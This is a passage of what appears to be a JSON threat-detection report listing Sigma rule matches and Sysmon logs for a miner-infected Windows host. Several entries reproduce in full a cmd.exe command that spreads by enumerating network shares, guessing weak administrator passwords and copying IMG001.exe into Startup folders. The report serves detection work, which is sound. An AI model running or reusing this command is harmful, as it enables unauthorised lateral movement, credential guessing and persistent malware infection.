                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-5F06-000000003B00}; ProcessId=3172; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C083-6560-4506-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8124; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use * /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839560; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08F-6560-9E06-000000003B00}; ProcessId=6676; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08A-6560-6C06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7380; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use * /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=0201\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839567; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08F-6560-9F06-000000003B00}; ProcessId=4932; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08D-6560-8206-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4964; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use * /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1809\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839567; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C09D-6560-DB06-000000003B00}; ProcessId=7036; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07E-6560-3706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7868; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use \\\\192.168.2.42\\C$ /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839581; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "9816ac44605bf8e1595ecff4424e6d78357aaa8449a03737687a18866b736909",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Windows Share Mount Via Net.EXE",
                                                                       "rule_description":  "Detects when a share is mounted using the \"net.exe\" utility",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07F-6560-4106-000000003B00}; ProcessId=8020; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07F-6560-4006-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8012; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  view \\\\192.168.2.42; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c net view \\\\192.168.2.42|find /i \"    \"; UtcTime=1700839551; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C085-6560-5006-000000003B00}; ProcessId=6308; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C085-6560-4F06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7276; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  view \\\\192.168.2.90; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c net view \\\\192.168.2.90|find /i \"    \"; UtcTime=1700839557; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-5E06-000000003B00}; ProcessId=7932; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07E-6560-3706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7868; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use * /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839560; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-5F06-000000003B00}; ProcessId=3172; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C083-6560-4506-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8124; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use * /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c 